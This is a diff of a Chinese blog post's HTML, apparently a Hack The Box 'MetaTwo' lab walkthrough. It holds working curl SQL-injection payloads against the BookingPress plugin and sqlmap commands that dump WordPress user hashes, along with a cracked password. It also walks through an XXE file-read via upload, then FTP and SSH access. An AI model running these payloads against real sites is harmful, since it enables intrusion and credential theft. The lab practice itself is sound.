@@ -294,29 +294,29 @@
 <span id="more"></span>
 
 <h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>拿到目标 IP，先 nmap 扫，发现开了 80 端口</p>
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/nmap.png" class>
 
 <p>设置 hosts，添加如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.186 metapress.htb</span><br></pre></td></tr></table></figure>
 
 <p>成功访问 80 端口，能够看到这其实是一个用 WordPress 搭建的网站，直接用 kali 自带的 wpscan 扫描</p>
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/wpscanResult.png" class>
 
 <p>比较有用的信息有信息泄露，以及 WordPress 版本，这里可以看到版本是 5.6.2，以及一些其他的可用信息，因为洞很多，所以这里肯定需要我们手动探测去思考一下最有可能被我们利用的是哪个漏洞，这里我看到 <code>/events</code> 目录下能够预定会议，感觉应该就是这里了，SQL 注入的洞。</p>
-<p>但是当时探测了很久都没打通，通过扫描 <code>/events</code> 目录发现了 booking press 框架，版本为 1.0.10，通过搜索发现，这个框架版本有 sql 注入的漏洞 <a class="link"   target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" >https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357<i class="fas fa-external-link-alt"></i></a></p>
+<p>但是当时探测了很久都没打通，通过扫描 <code>/events</code> 目录发现了 booking press 框架，版本为 1.0.10，通过搜索发现，这个框架版本有 sql 注入的漏洞 <a class="link" target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357<i class="fas fa-external-link-alt"></i></a></p>
 <p>根据漏洞描述，这里需要加入一个 <code>wpnonce</code> 字段，而这一字段我们是可以直接从源代码里面找的，我这里的是 c290c8df1f</p>
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/wpnonce.png" class>
 
 <p>payload 如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i &#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27; --data &#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=c290c8df1f&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>这里成功的将数据库版本等信息打出来了</p>
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/sqlPoC.png" class>
 
 <p>SQL 注入三步走，爆数据库为 blog</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i &#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27; --data &#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=c290c8df1f&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,database(),@@version_compile_os,1,2,3,4,5,6-- -&#x27;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/database.png" class>
 
 <p>将这个数据包保存下来，然后用 sqlmap 去跑，当然用 curl 也可以</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i &#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27; --data &#x27;action=b</span><br><span class="line">ookingpress_front_get_category_services&amp;_wpnonce=eef86ae8b3&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT (group_</span><br><span class="line">concat(tablE_nAme)),@@version_comment,@@version_compile_os,1,2,3,4,5,6 frOm/**/infOrmation_schEma.tablEs/**/whEre/**/tab</span><br><span class="line">le_schema=databAse()-- -&#x27;</span><br></pre></td></tr></table></figure>
@@ -331,11 +331,11 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r admin.req -p total_service -D blog --tables</span><br></pre></td></tr></table></figure>
 
 <p>主要看一下 wp_user 里面放了什么，爆列</p>
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/wp_user.png" class>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r admin.req -p total_service -D blog -T wp_users --columns</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/wp_colomns.png" class>
 
 <p>后续就是爆内容，这一步的爆内容我感觉要很久，所以就直接把结果贴在这边了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. </span><br><span class="line">manager $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70</span><br></pre></td></tr></table></figure>
@@ -347,7 +347,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager:partylikearockstar</span><br></pre></td></tr></table></figure>
 
 <p>这个密码肯定是用来登录 web 端后台页面的，所以去到默认接口 <code>/wp-login.php</code>，登录成功</p>
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/LoginAsManager.png" class>
 
 <p>进去之后就还是那个问题，这个洞它不顶用啊，拿不到 shell，且目前我们已知的信息和 wp-scan 给我们的信息是一样的，WordPress 版本 v5.6.2，一般挖洞的时候会说最好 RCE，退而求其次 SSRF，实在不行 XXE</p>
 <p>因为这里有个文件上传的功能点，猜测应该是一个 xxe 的洞，而 WordPress v5.6.2 就存在一个 XXE 的漏洞</p>
@@ -362,10 +362,10 @@
 <p>一上传文件就会发起请求，触发 xxe，我们再通过起的 web 服务可以查看文件内容</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.1:9001</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/uploadSuccess.png" class>
 
 <p>将内容 base64 解码一下</p>
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/base64Etc.png" class>
 
 <p>发现 XXE 能够打通，且发现了一个用户名为 jnelson 的用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash</span><br></pre></td></tr></table></figure>
@@ -385,15 +385,15 @@
 <p>成功脸上 ftp</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/ftpSuccess.png" class>
 
 <p>发现 mailer 里面有一个 <code>send_email.php</code> 文件，通过 get 命令传输到本机电脑上</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get send_email.php</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/emailSend.png" class>
 
 <p>终于是成功拿到了 jnelson 的密码，这个密码应该是 ssh 的，我们尝试连一下，拿下！</p>
-
+<img src="/2023/04/08/HTB-Machine-MetaTwo/flag.png" class>
 
 <p>拿下！</p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>挺有意思的题目，先 SQL 注入拿到普通用户权限，然后在进去之后继续打点，最后拿 shell，太有意思了</p>
